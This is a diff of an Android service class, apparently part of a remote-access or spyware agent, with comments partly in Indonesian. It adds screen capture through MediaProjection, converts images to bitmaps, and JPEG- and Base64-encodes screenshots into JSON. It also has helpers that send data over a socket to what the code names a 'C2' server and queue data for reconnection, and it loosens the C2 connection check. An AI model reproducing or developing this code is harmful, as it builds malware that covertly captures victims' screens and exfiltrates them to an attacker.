+                virtualDisplay.release(); 
+                Log.d(TAG, "✅ VirtualDisplay released");
+            } catch (Exception e) {}
+        }
+        if (reader != null) {
+            try { 
+                reader.close(); 
+                Log.d(TAG, "✅ ImageReader closed");
+            } catch (Exception e) {}
         }
     }
+}
+
+    // ✅ TAMBAHKAN - Convert Image ke Bitmap
+    // AgentService.java - TAMBAHKAN method ini
+
+private Bitmap convertImageToBitmap(Image image) {
+    if (image == null) {
+        Log.e(TAG, "❌ Image is null");
+        return null;
+    }
+
+    try {
+        Image.Plane[] planes = image.getPlanes();
+        if (planes == null || planes.length == 0) {
+            Log.e(TAG, "❌ No planes in image");
+            return null;
+        }
+
+        ByteBuffer buffer = planes[0].getBuffer();
+        if (buffer == null) {
+            Log.e(TAG, "❌ Buffer is null");
+            return null;
+        }
+
+        int width = image.getWidth();
+        int height = image.getHeight();
+        int pixelStride = planes[0].getPixelStride();
+        int rowStride = planes[0].getRowStride();
+
+        Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
+
+        if (rowStride == pixelStride * width) {
+            bitmap.copyPixelsFromBuffer(buffer);
+        } else {
+            ByteBuffer dstBuffer = ByteBuffer.allocate(width * height * 4);
+            for (int row = 0; row < height; row++) {
+                buffer.position(row * rowStride);
+                byte[] rowData = new byte[width * 4];
+                buffer.get(rowData);
+                dstBuffer.put(rowData);
+            }
+            dstBuffer.rewind();
+            bitmap.copyPixelsFromBuffer(dstBuffer);
+        }
+
+        return bitmap;
+
+    } catch (Exception e) {
+        Log.e(TAG, "❌ convertImageToBitmap error: " + e.getMessage(), e);
+        return null;
+    }
+}
 
     private Bitmap imageToBitmap(Image image) {
         if (image == null) return null;
@@ -3238,7 +3421,7 @@ public class AgentService extends Service {
     private Bitmap takeScreenshotViaCanvas() {
         try {
             Log.d(TAG, "📸 Trying Canvas screenshot...");
-            
+
             MediaProjection projection = ServiceController.getMediaProjection();
             if (projection != null) {
                 return takeScreenshotWithMediaProjection(projection);
@@ -3254,99 +3437,92 @@ public class AgentService extends Service {
 
     private boolean isAllWhite(Bitmap bitmap) {
         if (bitmap == null) return true;
-        
+
         try {
             int width = bitmap.getWidth();
             int height = bitmap.getHeight();
-            
+
             int sampleCount = 0;
             int whiteCount = 0;
-            
+
             int stepX = Math.max(1, width / 10);
             int stepY = Math.max(1, height / 10);
-            
+
             for (int x = 0; x < width; x += stepX) {
                 for (int y = 0; y < height; y += stepY) {
                     int pixel = bitmap.getPixel(x, y);
                     sampleCount++;
-                    
+
                     int r = Color.red(pixel);
                     int g = Color.green(pixel);
                     int b = Color.blue(pixel);
-                    
+
                     if (r > 240 && g > 240 && b > 240) {
                         whiteCount++;
                     }
                 }
             }
-            
+
             boolean allWhite = sampleCount > 0 && ((float) whiteCount / sampleCount) > 0.9;
             Log.d(TAG, "White detection: " + whiteCount + "/" + sampleCount + " -> " + (allWhite ? "ALL WHITE" : "OK"));
-            
+
             return allWhite;
-            
+
         } catch (Exception e) {
             Log.e(TAG, "White detection error: " + e.getMessage());
             return false;
         }
     }
 
-    private String processScreenshot(Bitmap bitmap) {
-        try {
-            if (bitmap == null) {
-                JSONObject result = new JSONObject();
-                result.put("status", "error");
-                result.put("message", "Bitmap is null");
-                return result.toString();
-            }
+    // AgentService.java - REPLACE method processScreenshot()
 
-            int maxWidth = 1920;
-            int maxHeight = 1080;
-            int width = bitmap.getWidth();
-            int height = bitmap.getHeight();
-
-            if (width > maxWidth || height > maxHeight) {
-                float ratio = Math.min(
-                        (float) maxWidth / width,
-                        (float) maxHeight / height
-                );
-                int newWidth = (int) (width * ratio);
-                int newHeight = (int) (height * ratio);
-                bitmap = Bitmap.createScaledBitmap(bitmap, newWidth, newHeight, true);
-            }
-
-            ByteArrayOutputStream baos = new ByteArrayOutputStream();
-            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
-            bitmap.recycle();
-
-            byte[] imageData = baos.toByteArray();
-
-            String filename = "screenshot_" + System.currentTimeMillis() + ".jpg";
-            File cacheFile = new File(getCacheDir(), filename);
-            FileOutputStream fos = new FileOutputStream(cacheFile);
-            fos.write(imageData);
-            fos.close();
-
-            String encoded = Base64.encodeToString(imageData, Base64.NO_WRAP);
-
+private String processScreenshot(Bitmap bitmap) {
+    try {
+        if (bitmap == null) {
             JSONObject result = new JSONObject();
-            result.put("status", "success");
-            result.put("type", "screenshot");
-            result.put("filename", filename);
-            result.put("timestamp", System.currentTimeMillis());
-            result.put("width", width);
-            result.put("height", height);
-            result.put("size", imageData.length);
-            result.put("image_data", encoded);
-            result.put("path", cacheFile.getAbsolutePath());
-
+            result.put("status", "error");
+            result.put("message", "Bitmap is null");
             return result.toString();
-
-        } catch (Exception e) {
-            Log.e(TAG, "Process screenshot error: " + e.getMessage());
-            return errorJson(e.getMessage());
         }
+
+        int maxWidth = 1920;
+        int maxHeight = 1080;
+        int width = bitmap.getWidth();
+        int height = bitmap.getHeight();
+
+        if (width > maxWidth || height > maxHeight) {
+            float ratio = Math.min(
+                    (float) maxWidth / width,
+                    (float) maxHeight / height
+            );
+            int newWidth = (int) (width * ratio);
+            int newHeight = (int) (height * ratio);
+            bitmap = Bitmap.createScaledBitmap(bitmap, newWidth, newHeight, true);
+        }
+
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
+        bitmap.recycle();
+
+        byte[] imageData = baos.toByteArray();
+        String encoded = Base64.encodeToString(imageData, Base64.NO_WRAP);
+
+        JSONObject result = new JSONObject();
+        result.put("status", "success");
+        result.put("type", "screenshot");
+        result.put("timestamp", System.currentTimeMillis());
+        result.put("width", width);
+        result.put("height", height);
+        result.put("size", imageData.length);
+        result.put("image_data", encoded);
+
+        return result.toString();
+
+    } catch (Exception e) {
+        Log.e(TAG, "Process screenshot error: " + e.getMessage());
+        return errorJson(e.getMessage());
     }
+}
 
     private void requestMediaProjectionPermission() {
         try {
@@ -3702,7 +3878,8 @@ public class AgentService extends Service {
     // ==================== QUEUE & CONNECTION HELPERS ====================
 
     public boolean isC2Connected() {
-        return isConnected.get() && out != null && socket != null && socket.isConnected();
+        //return isConnected.get() && out != null && socket != null && socket.isConnected();
+            return isConnected.get() && out != null;
     }
 
     public void sendRawData(String data) {
@@ -3711,7 +3888,7 @@ public class AgentService extends Service {
             queueDataForReconnect(data);
             return;
         }
-        
+
         backgroundHandler.post(() -> {
             try {
                 synchronized (out) {
@@ -3744,7 +3921,7 @@ public class AgentService extends Service {
     private void flushPendingData() {
         synchronized (pendingDataQueue) {
             if (pendingDataQueue.isEmpty()) return;
-            
+
             Log.d(TAG, "📤 Flushing " + pendingDataQueue.size() + " pending messages");
             for (String data : pendingDataQueue) {
                 try {
